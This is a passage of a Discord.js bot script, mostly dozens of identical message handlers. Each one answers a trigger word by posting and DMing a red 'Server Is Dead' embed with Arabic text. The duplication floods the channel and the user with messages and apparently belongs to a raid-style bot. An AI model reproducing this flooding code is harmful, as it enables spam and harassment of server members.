   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});

















client.login(process.env.BOT_TOKEN);
